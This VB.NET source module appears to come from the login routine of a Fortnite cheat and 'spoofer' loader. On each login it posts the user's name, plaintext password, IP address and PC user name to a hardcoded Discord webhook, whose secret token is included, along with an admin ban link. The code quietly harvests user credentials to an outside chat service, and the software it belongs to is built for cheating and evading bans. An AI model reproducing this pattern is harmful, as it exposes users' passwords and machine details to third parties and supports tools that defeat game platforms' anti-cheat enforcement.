Imports System.IO
Imports System.Net
Imports System.Text
Imports Newtonsoft.Json
Imports vente.VenteData
Module DiscordSend
    Async Sub Send()
        Dim LicenseStringer As String
        '# Formatting user details
        If stored_username = "" Then
            stored_username = "N/A"
        End If
        If stored_password = "" Then
            stored_password = "N/A"
        End If
        If stored_username = "eddit" Then
            stored_ip = "HIDDEN | ADMIN"
        End If
        If stored_license = "" Then
            stored_license = "Not found"
        End If

        '# Formatting license
        If stored_license.Contains("F") Then
            LicenseStringer = " [FORTNITE] "
        End If
        If stored_license.Contains("H") Then
            LicenseStringer = LicenseStringer & " [SPOOFER] "
        End If
        If stored_license = "" Then
            LicenseStringer = " NOT FOUND ANY "
        End If

        Dim webhookUrl As String = "https://discord.com/api/webhooks/1186362292711981096/3DpwKsa9cqLbQP_jk3zfvwKZH7LSXMKHX2jpjMGrAANL_MDER-yY2hKNIm59KuWl7pDR"
        Dim DataIgodzina As String = DateTime.Now.ToString

        Dim embedContent As String = $"{{ 
            ""embeds"":[
                {{
                    ""title"":""** {stored_username} ** Logged in."", 
                    ""description"":"""",
                    ""color"":3091967,
                    ""fields"":[
                        {{
                            ""name"":""SESSION INFORMATION"",
                            ""value"":"" • **Login** {stored_username} \n  • **Password** {stored_password} \n  • **IP** {stored_ip} \n • **PC-Name** {Environment.UserName} \n • **Account licenses** {LicenseStringer}"",
                            ""inline"":true
                        }},
                        {{
                            ""name"":""Admin actions"",
                            ""value"":""BAN User \n [Click to ban](https://edditdev.com/vente/database/{stored_username}/AddStatus.php?ID=BAN&INFO=Banned)"",
                            ""inline"":true
                        }}
                    ],
                    ""image"": {{
                        ""url"":""""
                    }},
                    ""thumbnail"": {{
                        ""url"":""https://i.imgur.com/n1Xyipo.png""
                    }},
                    ""footer"": {{
                        ""text"":""Session login date {DataIgodzina}"",
                        ""icon_url"":""""
                    }}
                }}
            ]
        }}"


        Dim request As HttpWebRequest = DirectCast(WebRequest.Create(webhookUrl), HttpWebRequest)
        request.Method = "POST"
        request.ContentType = "application/json"

        Using streamWriter As New StreamWriter(request.GetRequestStream())
            streamWriter.Write(embedContent)
            streamWriter.Flush()
            streamWriter.Close()
        End Using

        Try
            Dim response As HttpWebResponse = DirectCast(request.GetResponse(), HttpWebResponse)
        Catch ex As WebException
            MsgBox($"Wystąpił błąd: {ex.Message}")
        End Try



    End Sub
End Module
